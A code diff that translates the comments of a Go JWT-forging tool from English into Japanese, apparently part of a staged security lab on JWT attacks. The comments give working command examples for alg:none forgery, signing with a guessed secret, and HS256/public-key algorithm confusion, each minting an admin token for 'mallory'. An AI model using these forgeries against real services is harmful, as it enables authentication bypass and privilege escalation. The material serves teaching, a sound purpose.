@@ -1,19 +1,19 @@
-// forge builds a JWT by hand from a header and payload you supply — no
-// library, no server. It prints only the token to stdout, so it composes
-// with curl: TOKEN=$(go run ./tools/forge -header '...' -payload '...')
+// forge はheaderとpayloadを自分で組み立ててJWTを手作りするツール。
+// ライブラリもサーバも使わない。標準出力にトークンだけを出すので、
+// curlと組み合わせられる: TOKEN=$(go run ./tools/forge -header '...' -payload '...')
 //
-// Examples — see docs/05, 06, 07 for the full walkthroughs:
+// 例(手順の全体はdocs/05, 06, 07を参照):
 //
-//	# alg:none forgery (stage2)
+//	# alg:none偽造 (stage2)
 //	go run ./tools/forge -header '{"alg":"none","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}'
 //
-//	# sign with a guessed/known secret (stage3, stage4 confusion)
+//	# 推測/既知の鍵で署名 (stage3, stage4の混同攻撃)
 //	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
 //	  -secret sunny
 //
-//	# sign with a key file's exact bytes (stage4: the fetched /pubkey PEM)
+//	# ファイルのバイト列そのもので署名 (stage4: 取得した/pubkeyのPEM)
 //	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
 //	  -secret-file pubkey.pem
@@ -57,8 +57,8 @@ func main() {
 	}
 
 	if secretBytes == nil {
-		// No secret given: this is an alg:none-style token — the signature
-		// segment is left empty on purpose.
+		// 鍵が渡されていない場合はalg:none相当のトークンとして扱い、
+		// 署名部分をあえて空のままにする。
 		fmt.Println(signingInput + ".")
 		return
 	}
